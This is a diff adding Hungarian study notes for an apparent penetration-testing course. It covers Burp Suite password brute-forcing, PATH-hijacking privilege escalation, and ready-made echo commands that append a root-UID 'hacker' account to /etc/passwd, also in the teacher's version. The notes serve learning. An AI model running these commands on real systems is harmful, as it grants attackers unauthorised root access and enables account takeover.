@@ -115,6 +115,18 @@ Sérülékenységek külső oldalról:
 (verziókeresés: oldalaknál jobb klikk és view page source, ott pl. sok résznél a verziószám, vagy a pontos rész verziószáma, esetleg belépés után pl. phpmyadmin megmondja)
 
 
+Jelszófeltörés ha nem wordpress és nem basic auth: (pl. saját oldalnál)
+ - burp suite community edition ((ehhez proxyt is kellene állítani, vizsgán be lesz állítva alapból (foxyproxy)))
+((lehet ezzel legördülő menüket is kijátszani))
+  - webkéréseimet megnézhetem és akár módosíthatom is
+  - foxyproxy: options, name, 127.0.0.1, 8080 ((ha nem használjuk akkor kapcsoljuk ki))
+  - burp: intercept on
+  - megpróbálunk bejelentkezni valamin
+  - a burp elfogja és meg tudjuk nézni, módosítani, továbbítani
+   - jobb klikk, send to repeater, repeater-ben tudjuk nézni milyen választ kapunk, és át tudjuk írni ezeket
+   - jobb klikk, send to intruder, kijelölöm a jelszót, add, megadjuk a jelszavakat/jelszófájlt (meg felhasználónevet is lehet add-olni) (sniper attack (vizsgán), clusterbomb attack, stb.)
+    - abból tudhatjuk hogy melyik sikerült: státuszkód és a válasz hossza
+
 ------------------------------------------------------------------------
 2. fázis
 ------------------------------------------------------------------------
@@ -146,6 +158,22 @@ minden felhasználóváltás során érdemes végrehajtani:
    - pl. echo 'import pty;pty.spawn("/bin/bash")' > random.py -- ezzel konkrétan átlépünk juliet fiókjába
   - ha találunk egy .c fájlt (forráskód fájlt), azt tudjuk futtatni/cat-elni hogy megnézzük van-e benne egy parancs (chatgpt-nek is lehet megadni kimenetet hogy megtudjuk)
 (( ghydra használható arra hogy már lefordított fájlt reverse engineer-ezzünk, de ez vizsgán nem kell))
+(( védekezni úgy lehet ha minden programot/parancsot abszolút útvonallal hívunk meg, vagy a script elején: "export PATH=/usr/bin:/bin"))
+   - innen már tudunk szórakozni a környezeti változókkal, PATH exploitation
+    - pl. echo 'bash' > df
+    - chmod +x df
+    - echo $PATH
+((felülírjuk az export paranccsal hogy hol keresse az ilyen shell-eket))
+    - export PATH=/home/juliet:$PATH
+    - így már a mi shell scriptünket futtatja az eredeti script
+  - ha rendszergazdák vagyunk valamilyen formában és írhatjuk a /etc/passwd állományt akkor a következőt tegyük bele:
+   - hacker:JELSZO:0:0:hacker user:/root:/bin/bash
+   - JELSZO elkészítése (itt a jelszó alma): támadó gépen, openssl passwd -5 alma
+   - pl. echo 'hacker:$5$mjvl4ma9qOzNAG1k$xqfLO63MmEsNB7bNPky/a5TOPikEXkSMPN.Yw7PMA.4:0:0:hacker user:/root:/bin/bash' >> /etc/passwd
+   (( nehogy >-t írjunk >> helyett, a gép nem működne utána, ' idézőjel pedig szintén fontos))
+   - ezután már tényleges root-ok lehetünk, csak átváltunk a hacker felhasználónkra, és teljes hozzáférésünk van a gép minden részéhez
+(( oldal alján a tanár által leírva ugyan ez a passwd rész))
+
 
 ------------------------------------------------------------------------
 Példák:
@@ -172,11 +200,33 @@ Példa wordpress oldal feltörésre:
  VAGY plugin alapján
   -keresünk https://www.exploit-db.com/ oldalon sérülékenységet (cross-site scripting nem jó, minél újabbat keresünk, pipásnak kell lennie)
   -letöltjük a megfelelő .py file-t
-  -terminálban elindítjuk a jó paraméterrel (egyszer elindítod elmondja hogy kell)
+  -terminálban elindítjuk a jó paraméterrel (egyszer elindítod elmondja hogy kell) ((pma pmapass volt órán))
   -ki cat-eled a .py fájlt és a végén elmondja mit csinált (pl. új admin felhasználót hoz létre)
   -többi példa alapján, miután van admin fiókunk
 
 2. fázis példák
 
 
+
+
+---------------------------------------
+Tanár passwd része
+---------------------------------------
+HA IRHATJUK A /etc/passwd ALLOMANYT:
+ 
+Ezt adjuk hozza a /etc/passwd vegehez:
+ 
+hacker:JELSZO:0:0:hacker user:/root:/bin/bash
+ 
+JELSZO elkeszitese a tamado gepen (a jelszo itt most alma lesz):
+openssl passwd -5 alma
+ 
+A nalam elkeszult jelszo: $5$J3duGPV3dWN.YVO2$zrMkCO1ljY2t.EamYPeOYd.xnidpX.sBlUWRR53QN22
+ 
+Igy a vegleges parancs (nagyon fontos, hogy az echo utan egyszeres '-et hasznaljunk):
+ 
+ELV: echo 'blabla' >> /etc/passwd
+ 
+ 
+echo 'hacker:$5$J3duGPV3dWN.YVO2$zrMkCO1ljY2t.EamYPeOYd.xnidpX.sBlUWRR53QN22:0:0:hacker user:/root:/bin/bash' >> /etc/passwd
 
